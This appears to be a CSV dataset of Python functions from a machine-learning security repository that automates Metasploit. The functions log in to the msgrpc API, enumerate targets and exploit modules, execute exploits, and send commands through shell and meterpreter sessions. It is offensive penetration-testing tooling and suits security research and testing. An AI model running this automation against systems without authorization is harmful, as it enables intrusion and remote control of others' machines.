Repository,Function_Name,Function_Code
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, option=[]):
    self.host = option.get('host') or '127.0.0.1'
    self.port = option.get('port') or 55552
    self.uri = option.get('uri') or '/api/'
    self.ssl = option.get('ssl') or False
    self.authenticated = False
    self.token = False
    self.headers = {'Content-type': 'binary/message-pack'}
    if self.ssl:
        self.client = http.client.HTTPSConnection(self.host, self.port)
    else:
        self.client = http.client.HTTPConnection(self.host, self.port)
    self.util = Utilty()
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except FileExistsError as err:
        self.util.print_message(FAIL, 'File exists error: {}'.format(err))
        sys.exit(1)
    self.msgrpc_user = config['Common']['msgrpc_user']
    self.msgrpc_pass = config['Common']['msgrpc_pass']
    self.timeout = int(config['Common']['timeout'])
    self.con_retry = int(config['Common']['con_retry'])
    self.retry_count = 0
    self.console_id = 0"
13o-bbr-bbq/machine_learning_security,call,"def call(self, meth, origin_option):
    option = copy.deepcopy(origin_option)
    option = self.set_api_option(meth, option)
    resp = self.send_request(meth, option, origin_option)
    return msgpack.unpackb(resp.read())"
13o-bbr-bbq/machine_learning_security,set_api_option,"def set_api_option(self, meth, option):
    if meth != 'auth.login':
        if not self.authenticated:
            self.util.print_message(FAIL, 'MsfRPC: Not Authenticated.')
            exit(1)
    if meth != 'auth.login':
        option.insert(0, self.token)
    option.insert(0, meth)
    return option"
13o-bbr-bbq/machine_learning_security,send_request,"def send_request(self, meth, option, origin_option):
    params = msgpack.packb(option)
    resp = ''
    try:
        self.client.request('POST', self.uri, params, self.headers)
        resp = self.client.getresponse()
        self.retry_count = 0
    except Exception as err:
        while True:
            self.retry_count += 1
            if self.retry_count == self.con_retry:
                self.util.print_exception(err, 'Retry count is over.')
                exit(1)
            else:
                self.util.print_message(WARNING, '{}/{} Retry ""{}"" call. reason: {}'.format(self.retry_count, self.con_retry, option[0], err))
                time.sleep(1.0)
                if self.ssl:
                    self.client = http.client.HTTPSConnection(self.host, self.port)
                else:
                    self.client = http.client.HTTPConnection(self.host, self.port)
                if meth != 'auth.login':
                    self.login(self.msgrpc_user, self.msgrpc_pass)
                    option = self.set_api_option(meth, origin_option)
                    self.get_console()
                resp = self.send_request(meth, option, origin_option)
                break
    return resp"
13o-bbr-bbq/machine_learning_security,login,"def login(self, user, password):
    ret = self.call('auth.login', [user, password])
    try:
        if ret.get(b'result') == b'success':
            self.authenticated = True
            self.token = ret.get(b'token')
            return True
        else:
            self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
            exit(1)
    except Exception as e:
        self.util.print_exception(e, 'Failed: auth.login')
        exit(1)"
13o-bbr-bbq/machine_learning_security,keep_alive,"def keep_alive(self):
    self.util.print_message(OK, 'Executing keep_alive..')
    _ = self.send_command(self.console_id, 'version\n', False)"
13o-bbr-bbq/machine_learning_security,get_console,"def get_console(self):
    ret = self.call('console.create', [])
    try:
        self.console_id = ret.get(b'id')
        _ = self.call('console.read', [self.console_id])
    except Exception as err:
        self.util.print_exception(err, 'Failed: console.create')
        exit(1)"
13o-bbr-bbq/machine_learning_security,send_command,"def send_command(self, console_id, command, visualization, sleep=0.1):
    _ = self.call('console.write', [console_id, command])
    time.sleep(0.5)
    ret = self.call('console.read', [console_id])
    time.sleep(sleep)
    result = ''
    try:
        result = ret.get(b'data').decode('utf-8')
        if visualization:
            self.util.print_message(OK, 'Result of ""{}"":\n{}'.format(command, result))
    except Exception as e:
        self.util.print_exception(e, 'Failed: {}'.format(command))
    return result"
13o-bbr-bbq/machine_learning_security,get_module_list,"def get_module_list(self, module_type):
    ret = {}
    if module_type == 'exploit':
        ret = self.call('module.exploits', [])
    elif module_type == 'auxiliary':
        ret = self.call('module.auxiliary', [])
    elif module_type == 'post':
        ret = self.call('module.post', [])
    elif module_type == 'payload':
        ret = self.call('module.payloads', [])
    elif module_type == 'encoder':
        ret = self.call('module.encoders', [])
    elif module_type == 'nop':
        ret = self.call('module.nops', [])
    try:
        byte_list = ret[b'modules']
        string_list = []
        for module in byte_list:
            string_list.append(module.decode('utf-8'))
        return string_list
    except Exception as e:
        self.util.print_exception(e, 'Failed: Getting {} module list.'.format(module_type))
        exit(1)"
13o-bbr-bbq/machine_learning_security,get_module_info,"def get_module_info(self, module_type, module_name):
    return self.call('module.info', [module_type, module_name])"
13o-bbr-bbq/machine_learning_security,get_compatible_payload_list,"def get_compatible_payload_list(self, module_name):
    ret = self.call('module.compatible_payloads', [module_name])
    try:
        byte_list = ret[b'payloads']
        string_list = []
        for module in byte_list:
            string_list.append(module.decode('utf-8'))
        return string_list
    except Exception as e:
        self.util.print_exception(e, 'Failed: module.compatible_payloads.')
        return []"
13o-bbr-bbq/machine_learning_security,get_target_compatible_payload_list,"def get_target_compatible_payload_list(self, module_name, target_num):
    ret = self.call('module.target_compatible_payloads', [module_name, target_num])
    try:
        byte_list = ret[b'payloads']
        string_list = []
        for module in byte_list:
            string_list.append(module.decode('utf-8'))
        return string_list
    except Exception as e:
        self.util.print_exception(e, 'Failed: module.target_compatible_payloads.')
        return []"
13o-bbr-bbq/machine_learning_security,get_module_options,"def get_module_options(self, module_type, module_name):
    return self.call('module.options', [module_type, module_name])"
13o-bbr-bbq/machine_learning_security,execute_module,"def execute_module(self, module_type, module_name, options):
    ret = self.call('module.execute', [module_type, module_name, options])
    try:
        job_id = ret[b'job_id']
        uuid = ret[b'uuid'].decode('utf-8')
        return (job_id, uuid)
    except Exception as e:
        if ret[b'error_code'] == 401:
            self.login(self.msgrpc_user, self.msgrpc_pass)
        else:
            self.util.print_exception(e, 'Failed: module.execute.')
            exit(1)"
13o-bbr-bbq/machine_learning_security,get_job_list,"def get_job_list(self):
    jobs = self.call('job.list', [])
    try:
        byte_list = jobs.keys()
        job_list = []
        for job_id in byte_list:
            job_list.append(int(job_id.decode('utf-8')))
        return job_list
    except Exception as e:
        self.util.print_exception(e, 'Failed: job.list.')
        return []"
13o-bbr-bbq/machine_learning_security,get_job_info,"def get_job_info(self, job_id):
    return self.call('job.info', [job_id])"
13o-bbr-bbq/machine_learning_security,stop_job,"def stop_job(self, job_id):
    return self.call('job.stop', [job_id])"
13o-bbr-bbq/machine_learning_security,get_session_list,"def get_session_list(self):
    return self.call('session.list', [])"
13o-bbr-bbq/machine_learning_security,stop_session,"def stop_session(self, session_id):
    _ = self.call('session.stop', [str(session_id)])"
13o-bbr-bbq/machine_learning_security,stop_meterpreter_session,"def stop_meterpreter_session(self, session_id):
    _ = self.call('session.meterpreter_session_detach', [str(session_id)])"
13o-bbr-bbq/machine_learning_security,execute_shell,"def execute_shell(self, session_id, cmd):
    ret = self.call('session.shell_write', [str(session_id), cmd])
    try:
        return ret[b'write_count'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: {}'.format(cmd))
        return 'Failed'"
13o-bbr-bbq/machine_learning_security,get_shell_result,"def get_shell_result(self, session_id, read_pointer):
    ret = self.call('session.shell_read', [str(session_id), read_pointer])
    try:
        seq = ret[b'seq'].decode('utf-8')
        data = ret[b'data'].decode('utf-8')
        return (seq, data)
    except Exception as e:
        self.util.print_exception(e, 'Failed: session.shell_read.')
        return (0, 'Failed')"
13o-bbr-bbq/machine_learning_security,execute_meterpreter,"def execute_meterpreter(self, session_id, cmd):
    ret = self.call('session.meterpreter_write', [str(session_id), cmd])
    try:
        return ret[b'result'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: {}'.format(cmd))
        return 'Failed'"
13o-bbr-bbq/machine_learning_security,execute_meterpreter_run_single,"def execute_meterpreter_run_single(self, session_id, cmd):
    ret = self.call('session.meterpreter_run_single', [str(session_id), cmd])
    try:
        return ret[b'result'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: {}'.format(cmd))
        return 'Failed'"
13o-bbr-bbq/machine_learning_security,get_meterpreter_result,"def get_meterpreter_result(self, session_id):
    ret = self.call('session.meterpreter_read', [str(session_id)])
    try:
        return ret[b'data'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: session.meterpreter_read')
        return None"
13o-bbr-bbq/machine_learning_security,upgrade_shell_session,"def upgrade_shell_session(self, session_id, lhost, lport):
    ret = self.call('session.shell_upgrade', [str(session_id), lhost, lport])
    try:
        return ret[b'result'].decode('utf-8')
    except Exception as e:
        self.util.print_exception(e, 'Failed: session.shell_upgrade')
        return 'Failed'"
13o-bbr-bbq/machine_learning_security,logout,"def logout(self):
    ret = self.call('auth.logout', [self.token])
    try:
        if ret.get(b'result') == b'success':
            self.authenticated = False
            self.token = ''
            return True
        else:
            self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
            exit(1)
    except Exception as e:
        self.util.print_exception(e, 'Failed: auth.logout')
        exit(1)"
13o-bbr-bbq/machine_learning_security,termination,"def termination(self, console_id):
    _ = self.call('console.session_kill', [console_id])
    _ = self.logout()"
13o-bbr-bbq/machine_learning_security,__init__,"def __init__(self, target_ip='127.0.0.1'):
    self.util = Utilty()
    self.rhost = target_ip
    full_path = os.path.dirname(os.path.abspath(__file__))
    config = configparser.ConfigParser()
    try:
        config.read(os.path.join(full_path, 'config.ini'))
    except FileExistsError as err:
        self.util.print_message(FAIL, 'File exists error: {}'.format(err))
        sys.exit(1)
    server_host = config['Common']['server_host']
    server_port = int(config['Common']['server_port'])
    self.msgrpc_user = config['Common']['msgrpc_user']
    self.msgrpc_pass = config['Common']['msgrpc_pass']
    self.timeout = int(config['Common']['timeout'])
    self.max_attempt = int(config['Common']['max_attempt'])
    self.save_path = os.path.join(full_path, config['Common']['save_path'])
    self.save_file = os.path.join(self.save_path, config['Common']['save_file'])
    self.data_path = os.path.join(full_path, config['Common']['data_path'])
    if os.path.exists(self.data_path) is False:
        os.mkdir(self.data_path)
    self.plot_file = os.path.join(self.data_path, config['Common']['plot_file'])
    self.port_div_symbol = config['Common']['port_div']
    self.lhost = server_host
    self.lport = int(config['Metasploit']['lport'])
    self.proxy_host = config['Metasploit']['proxy_host']
    self.proxy_port = int(config['Metasploit']['proxy_port'])
    self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
    self.path_collection = str(config['Metasploit']['path_collection']).split('@')
    self.nmap_command = config['Nmap']['command']
    self.nmap_timeout = config['Nmap']['timeout']
    self.nmap_2nd_command = config['Nmap']['second_command']
    self.nmap_2nd_timeout = config['Nmap']['second_timeout']
    self.train_worker_num = int(config['A3C']['train_worker_num'])
    self.train_max_num = int(config['A3C']['train_max_num'])
    self.train_max_steps = int(config['A3C']['train_max_steps'])
    self.train_tmax = int(config['A3C']['train_tmax'])
    self.test_worker_num = int(config['A3C']['test_worker_num'])
    self.greedy_rate = float(config['A3C']['greedy_rate'])
    self.eps_steps = int(self.train_max_num * self.greedy_rate)
    self.state = []
    self.os_type = str(config['State']['os_type']).split('@')
    self.os_real = len(self.os_type) - 1
    self.service_list = str(config['State']['services']).split('@')
    self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
    self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
    if os.path.exists(self.report_train_path) is False:
        os.mkdir(self.report_train_path)
    self.scan_start_time = self.util.get_current_date()
    self.source_host = server_host
    self.client = Msgrpc({'host': server_host, 'port': server_port})
    self.client.login(self.msgrpc_user, self.msgrpc_pass)
    self.client.get_console()
    self.buffer_seq = 0
    self.isPostExploit = False"
13o-bbr-bbq/machine_learning_security,get_exploit_tree,"def get_exploit_tree(self):
    self.util.print_message(NOTE, 'Get exploit tree.')
    exploit_tree = {}
    if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is False:
        for (idx, exploit) in enumerate(com_exploit_list):
            temp_target_tree = {'targets': []}
            temp_tree = {}
            use_cmd = 'use exploit/' + exploit + '\n'
            _ = self.client.send_command(self.client.console_id, use_cmd, False)
            show_cmd = 'show targets\n'
            target_info = ''
            time_count = 0
            while True:
                target_info = self.client.send_command(self.client.console_id, show_cmd, False)
                if 'Exploit targets' in target_info:
                    break
                if time_count == 5:
                    self.util.print_message(OK, 'Timeout: {0}'.format(show_cmd))
                    self.util.print_message(OK, 'No exist Targets.')
                    break
                time.sleep(1.0)
                time_count += 1
            target_list = self.cutting_strings('\\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\\r\\n]', target_info)
            for target in target_list:
                payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                temp_tree[target] = payload_list
            options = self.client.get_module_options('exploit', exploit)
            key_list = options.keys()
            option = {}
            for key in key_list:
                sub_option = {}
                sub_key_list = options[key].keys()
                for sub_key in sub_key_list:
                    if isinstance(options[key][sub_key], list):
                        end_option = []
                        for end_key in options[key][sub_key]:
                            end_option.append(end_key.decode('utf-8'))
                        sub_option[sub_key.decode('utf-8')] = end_option
                    else:
                        end_option = {}
                        if isinstance(options[key][sub_key], bytes):
                            sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                        else:
                            sub_option[sub_key.decode('utf-8')] = options[key][sub_key]
                sub_option['user_specify'] = ''
                option[key.decode('utf-8')] = sub_option
            temp_target_tree['target_list'] = target_list
            temp_target_tree['targets'] = temp_tree
            temp_target_tree['options'] = option
            exploit_tree[exploit] = temp_target_tree
            self.util.print_message(OK, '{}/{} exploit:{}, targets:{}'.format(str(idx + 1), len(com_exploit_list), exploit, len(target_list)))
        fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
        json.dump(exploit_tree, fout, indent=4)
        fout.close()
        self.util.print_message(OK, 'Saved exploit tree.')
    else:
        local_file = os.path.join(self.data_path, 'exploit_tree.json')
        self.util.print_message(OK, 'Loaded exploit tree from : {}'.format(local_file))
        fin = codecs.open(local_file, 'r', 'utf-8')
        exploit_tree = json.loads(fin.read().replace('\x00', ''))
        fin.close()
    return exploit_tree"
13o-bbr-bbq/machine_learning_security,get_target_info,"def get_target_info(self, rhost, proto_list, port_info):
    self.util.print_message(NOTE, 'Get target info.')
    target_tree = {}
    if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
        path_list = ['' for idx in range(len(com_port_list))]
        if self.isPostExploit is False:
            version_checker = VersionChecker(self.util)
            version_checker_ml = VersionCheckerML(self.util)
            content_explorer = ContentExplorer(self.util)
            web_port_list = self.util.check_web_port(rhost, com_port_list, self.client)
            web_target_info = self.util.run_spider(rhost, web_port_list, self.client)
            uniq_product = []
            for (idx_target, target) in enumerate(web_target_info):
                web_prod_list = []
                target_list = target[2]
                if self.util.is_scramble is True:
                    self.util.print_message(WARNING, 'Scramble target list.')
                    target_list = random.sample(target[2], len(target[2]))
                if self.util.max_target_url != 0 and self.util.max_target_url < len(target_list):
                    self.util.print_message(WARNING, 'Cutting target list {} to {}.'.format(len(target[2]), self.util.max_target_url))
                    target_list = target_list[:self.util.max_target_url]
                for (count, target_url) in enumerate(target_list):
                    self.util.print_message(NOTE, '{}/{} Start analyzing: {}'.format(count + 1, len(target_list), target_url))
                    self.client.keep_alive()
                    parsed = util.parse_url(target_url)
                    if parsed is None:
                        continue
                    (_, res_header, res_body) = self.util.send_request('GET', target_url)
                    if self.util.max_target_byte != 0 and self.util.max_target_byte < len(res_body):
                        self.util.print_message(WARNING, 'Cutting response byte {} to {}.'.format(len(res_body), self.util.max_target_byte))
                        res_body = res_body[:self.util.max_target_byte]
                    web_prod_list.extend(version_checker.get_product_name(parsed, res_header + res_body, self.client))
                    web_prod_list.extend(version_checker_ml.get_product_name(parsed, res_header + res_body, self.client))
                parsed = None
                try:
                    parsed = util.parse_url(target[0])
                except Exception as e:
                    self.util.print_exception(e, 'Parsed error : {}'.format(target[0]))
                    continue
                web_prod_list.extend(content_explorer.content_explorer(parsed, target[0], self.client))
                tmp_list = []
                for item in list(set(web_prod_list)):
                    tmp_item = item.split('@')
                    tmp = tmp_item[0] + ' ' + tmp_item[1] + ' ' + tmp_item[2]
                    if tmp not in tmp_list:
                        tmp_list.append(tmp)
                        uniq_product.append(item)
            for (idx, web_prod) in enumerate(uniq_product):
                web_item = web_prod.split('@')
                proto_list.append('tcp')
                port_info.append(web_item[0] + ' ' + web_item[1])
                com_port_list.append(web_item[2] + self.port_div_symbol + str(idx))
                path_list.append(web_item[3])
        target_tree = {'rhost': rhost, 'os_type': self.os_real}
        for (port_idx, port_num) in enumerate(com_port_list):
            temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'target_path': '', 'exploit': []}
            service_name = 'unknown'
            for (idx, service) in enumerate(self.service_list):
                if service in port_info[port_idx].lower():
                    service_name = service
                    break
            temp_tree['prod_name'] = service_name
            regex_list = ['.*\\s(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}).*', '.*\\s[a-z]?(\\d{1,3}\\.\\d{1,3}[a-z]\\d{1,3}).*', '.*\\s[\\w]?(\\d{1,3}\\.\\d{1,3}\\.\\d[a-z]{1,3}).*', '.*\\s[a-z]?(\\d\\.\\d).*', '.*\\s(\\d\\.[xX|\\*]).*']
            version = 0.0
            output_version = 0.0
            for (idx, regex) in enumerate(regex_list):
                version_raw = self.cutting_strings(regex, port_info[port_idx])
                if len(version_raw) == 0:
                    continue
                if idx == 0:
                    index = version_raw[0].rfind('.')
                    version = version_raw[0][:index] + version_raw[0][index + 1:]
                    output_version = version_raw[0]
                    break
                elif idx == 1:
                    index = re.search('[a-z]', version_raw[0]).start()
                    version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                    output_version = version_raw[0]
                    break
                elif idx == 2:
                    index = re.search('[a-z]', version_raw[0]).start()
                    version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                    index = version.rfind('.')
                    version = version_raw[0][:index] + version_raw[0][index:]
                    output_version = version_raw[0]
                    break
                elif idx == 3:
                    version = self.cutting_strings('[a-z]?(\\d\\.\\d)', version_raw[0])
                    version = version[0]
                    output_version = version_raw[0]
                    break
                elif idx == 4:
                    version = version_raw[0].replace('X', '0').replace('x', '0').replace('*', '0')
                    version = version[0]
                    output_version = version_raw[0]
            temp_tree['version'] = float(version)
            temp_tree['protocol'] = proto_list[port_idx]
            if path_list is not None:
                temp_tree['target_path'] = path_list[port_idx]
            module_list = []
            raw_module_info = ''
            idx = 0
            search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
            raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
            module_list = self.extract_osmatch_module(self.cutting_strings('(exploit/.*)', raw_module_info))
            if service_name != 'unknown' and len(module_list) == 0:
                self.util.print_message(WARNING, ""Can't load exploit module: {}"".format(service_name))
                temp_tree['prod_name'] = 'unknown'
            for module in module_list:
                if module[1] in {'excellent', 'great', 'good'}:
                    temp_tree['exploit'].append(module[0])
            target_tree[str(port_num)] = temp_tree
            self.util.print_message(OK, 'Analyzing port {}/{}, {}/{}, Available exploit modules:{}'.format(port_num, temp_tree['protocol'], temp_tree['prod_name'], output_version, len(temp_tree['exploit'])))
        fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
        json.dump(target_tree, fout, indent=4)
        fout.close()
        self.util.print_message(OK, 'Saved target tree.')
    else:
        saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
        self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
        fin = codecs.open(saved_file, 'r', 'utf-8')
        target_tree = json.loads(fin.read().replace('\x00', ''))
        fin.close()
    return target_tree"
